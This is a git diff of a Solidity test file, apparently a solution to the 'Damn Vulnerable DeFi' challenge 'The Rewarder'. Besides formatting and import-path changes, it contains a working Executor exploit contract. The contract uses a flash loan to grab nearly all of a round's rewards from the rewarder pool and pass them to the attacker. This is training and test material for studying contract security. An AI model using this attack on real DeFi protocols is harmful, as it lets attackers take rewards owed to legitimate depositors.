@@ -4,16 +4,15 @@ pragma solidity 0.8.10;
 import {Utilities} from "../utils/Utilities.sol";
 import {BaseTest} from "../BaseTest.sol";
 
-import "../../the-rewarder/FlashLoanerPool.sol";
-import "../../the-rewarder/TheRewarderPool.sol";
-import "../../the-rewarder/RewardToken.sol";
-import "../../the-rewarder/AccountingToken.sol";
-import "../../DamnValuableToken.sol";
+import "../../src/the-rewarder/FlashLoanerPool.sol";
+import "../../src/the-rewarder/TheRewarderPool.sol";
+import "../../src/the-rewarder/RewardToken.sol";
+import "../../src/the-rewarder/AccountingToken.sol";
+import "../../src/DamnValuableToken.sol";
 
 import "openzeppelin-contracts/utils/Address.sol";
 
 contract Executor {
-
     FlashLoanerPool flashLoanPool;
     TheRewarderPool rewarderPool;
     DamnValuableToken liquidityToken;
@@ -21,7 +20,12 @@ contract Executor {
 
     address owner;
 
-    constructor(DamnValuableToken _liquidityToken, FlashLoanerPool _flashLoanPool, TheRewarderPool _rewarderPool, RewardToken _rewardToken) {
+    constructor(
+        DamnValuableToken _liquidityToken,
+        FlashLoanerPool _flashLoanPool,
+        TheRewarderPool _rewarderPool,
+        RewardToken _rewardToken
+    ) {
         owner = msg.sender;
         liquidityToken = _liquidityToken;
         flashLoanPool = _flashLoanPool;
@@ -31,7 +35,7 @@ contract Executor {
 
     function receiveFlashLoan(uint256 borrowAmount) external {
         require(msg.sender == address(flashLoanPool), "only pool");
-        
+
         liquidityToken.approve(address(rewarderPool), borrowAmount);
 
         // theorically depositing DVT call already distribute reward if the next round has already started
@@ -41,7 +45,10 @@ contract Executor {
         rewarderPool.withdraw(borrowAmount);
 
         // we send back the borrowed tocken
-        bool payedBorrow = liquidityToken.transfer(address(flashLoanPool), borrowAmount);
+        bool payedBorrow = liquidityToken.transfer(
+            address(flashLoanPool),
+            borrowAmount
+        );
         require(payedBorrow, "Borrow not payed back");
 
         // we transfer the rewarded RewardToken to the contract's owner
@@ -54,13 +61,14 @@ contract Executor {
     function attack() external {
         require(msg.sender == owner, "only owner");
 
-        uint256 dvtPoolBalance = liquidityToken.balanceOf(address(flashLoanPool));
+        uint256 dvtPoolBalance = liquidityToken.balanceOf(
+            address(flashLoanPool)
+        );
         flashLoanPool.flashLoan(dvtPoolBalance);
     }
 }
 
 contract TheRewarderTest is BaseTest {
-
     uint TOKENS_IN_LENDER_POOL = 1000000 ether;
 
     DamnValuableToken liquidityToken;
@@ -106,10 +114,9 @@ contract TheRewarderTest is BaseTest {
         rewardToken = rewarderPool.rewardToken();
         accountingToken = rewarderPool.accToken();
 
-
         // Alice, Bob, Charlie and David deposit 100 tokens each
         // start from 1 because 0 is the attacker
-        for( uint256 i = 1; i < users.length; i++ ) {
+        for (uint256 i = 1; i < users.length; i++) {
             uint256 amount = 100 ether;
             liquidityToken.transfer(users[i], amount);
 
@@ -129,7 +136,7 @@ contract TheRewarderTest is BaseTest {
 
         // Each depositor gets 25 reward tokens
         // start from 1 because 0 is the attacker
-        for( uint256 i = 1; i < users.length; i++ ) {
+        for (uint256 i = 1; i < users.length; i++) {
             vm.prank(users[i]);
             rewarderPool.distributeRewards();
             assertEq(rewardToken.balanceOf(users[i]), 25 ether);
@@ -143,7 +150,6 @@ contract TheRewarderTest is BaseTest {
         assertEq(rewarderPool.roundNumber(), 2);
     }
 
-    
     function test_Exploit() public {
         runTest();
     }
@@ -156,7 +162,12 @@ contract TheRewarderTest is BaseTest {
 
         // deploy the exploit contract
         vm.startPrank(attacker);
-        Executor executor = new Executor(liquidityToken, flashLoanPool, rewarderPool, rewardToken);
+        Executor executor = new Executor(
+            liquidityToken,
+            flashLoanPool,
+            rewarderPool,
+            rewardToken
+        );
         executor.attack();
         vm.stopPrank();
     }
@@ -169,7 +180,7 @@ contract TheRewarderTest is BaseTest {
 
         // Users should get neglegible rewards this round
         // start from 1 because 0 is the attacker
-        for( uint256 i = 1; i < users.length; i++ ) {
+        for (uint256 i = 1; i < users.length; i++) {
             vm.prank(users[i]);
             rewarderPool.distributeRewards();
 
@@ -179,7 +190,7 @@ contract TheRewarderTest is BaseTest {
             uint256 delta = rewards - 25 ether;
             assertLt(delta, 0.01 ether);
         }
-        
+
         // Rewards must have been issued to the attacker account
         assertGt(rewardToken.totalSupply(), 100 ether);
         uint256 rewardsAttacker = rewardToken.balanceOf(attacker);
